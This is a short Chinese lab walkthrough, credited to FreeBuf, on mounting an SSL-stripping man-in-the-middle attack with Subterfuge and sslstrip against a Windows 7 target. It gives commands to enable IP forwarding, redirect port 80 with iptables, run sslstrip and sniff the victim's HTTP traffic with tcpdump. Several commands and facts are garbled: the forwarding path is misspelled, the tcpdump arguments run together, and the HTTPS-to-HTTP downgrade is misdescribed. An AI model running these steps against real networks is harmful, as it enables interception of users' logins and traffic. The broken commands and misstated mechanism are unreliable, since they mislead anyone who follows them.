
subterfuge
------------------------------------


**Subterfuge是一款用python写的中间人攻击框架，它集成了一个前端和收集了一些著名的可用于中间人攻击的安全工具。**

Subterfuge主要调用的是sslstrip，sslstrip 是08
年黑帽大会提出的工具，它能突破对SSL的嗅探会进行自动的中间人攻击来拦截通讯的HTTP
流量，然后将流量中所有出现的HTTP
链接全部替换为HTTP，并把这个过程记录下来。接下来使用替换好的 HTTP
与目标机器进行连接，并且与服务器，也就是server 端进行HTTPS
，这样就可以对目标机器与服务器之间的所有通讯进行一个代理转发。

### 使用环境：

> 攻击机：archlinux   ip：192.168.248.145
>
> 目标主机：windows 7  ip：192.168.248.148

实验步骤：
----------

### 使用

直接使用blackarch的源安装subterfuge

    pacaur -S subterfuge

还需要同时安装python2-django，但是还不能兼容最新的版本，要安装旧版

    sudo pip2 install django=="1.5"

开启网卡转发

    echo “1” >/proc/sys/net/ipv4/ip_forword

使用iptables把80端口的数据转发到1234端口，方便sslstrip进行监听 

    iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 1234

### 启用sslstrip进行

-a 记录所有来这SSL和HTTP的数据

-l 1234 监听来自1234端口的数据与之前设置的iptables端口号一样

    ./sslstrip.py -a -l 1234

已成功启动sslstrip进行监听，现在启动tcpdump进行嗅探并捕获转发的报文

在攻击机上执行   

     tcpdump –A –i eth0tcp and src 192.168.248.148 and port 80

-A 开启ASCALL模式，把捕获的数据已ACSALL模式显示

-i 选择监听的网卡

> 原文地址: <http://www.freebuf.com/sectool/130456.html>
